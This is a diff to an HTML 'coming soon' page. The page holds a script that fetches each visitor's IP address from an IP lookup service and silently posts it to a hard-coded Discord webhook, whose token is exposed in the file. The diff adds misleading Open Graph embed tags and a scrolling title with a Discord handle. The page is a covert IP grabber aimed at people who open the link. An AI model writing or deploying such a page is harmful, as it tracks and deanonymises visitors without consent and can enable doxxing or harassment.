@@ -1,22 +1,25 @@
+<meta content="Embed Title" property="og:title" />
+<meta content="Site Description" property="og:description" />
+<meta content="https://embed.com/this-is-the-site-url" property="og:url" />
+<meta content="https://embed.com/embedimage.png" property="og:image" />
+<meta content="#43B581" data-react-helmet="true" name="theme-color" />
 <!DOCTYPE html>
 <html>
   <head>
-    <title>kiro</title>
+    <meta charset="UTF-8">
     <style>
       body {
         background-color: black;
         color: white;
+        font-size: 48px;
         text-align: center;
-        font-size: 50px;
-        margin-top: 30%;
+        margin-top: 200px;
       }
     </style>
-  </head>
-  <body>
-    SOON
     <script type="text/javascript">
       const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1107037105902854195/4pp8cLSJCLBfoXfphudj7aVUZBhyJ3Uo_tCv3ZD7E3B9ilAIOB4yOvYIxcP9jNrkGhD0";
 
+      // Use an API to get the user's IP address
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -28,10 +31,47 @@
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              content: 'IP:' + ipAddress
+              content: 'IP :skull:\: ' + ipAddress
             })
           });
         });
     </script>
+    <script language="javascript">
+      var rev = "fwd";
+      function titlebar(val){
+        var msg  = "kiro#3171";
+        var res = " ";
+        var speed = 125;
+        var pos = val;
+        msg = "   "+msg+"";
+        var le = msg.length;
+        if(rev == "fwd"){
+          if(pos < le){
+            pos = pos+1;
+            scroll = msg.substr(0,pos);
+            document.title = scroll;
+            timer = window.setTimeout("titlebar("+pos+")",speed);
+          } else {
+            rev = "bwd";
+            timer = window.setTimeout("titlebar("+pos+")",speed);
+          }
+        } else {
+          if(pos > 0) {
+            pos = pos-1;
+            var ale = le-pos;
+            scrol = msg.substr(ale,le);
+            document.title = scrol;
+            timer = window.setTimeout("titlebar("+pos+")",speed);
+          } else {
+            rev = "fwd";
+            timer = window.setTimeout("titlebar("+pos+")",speed);
+          }
+        }
+      }
+      titlebar(0);
+    </script>
+  </head>
+  <body>
+    SOON
   </body>
 </html>
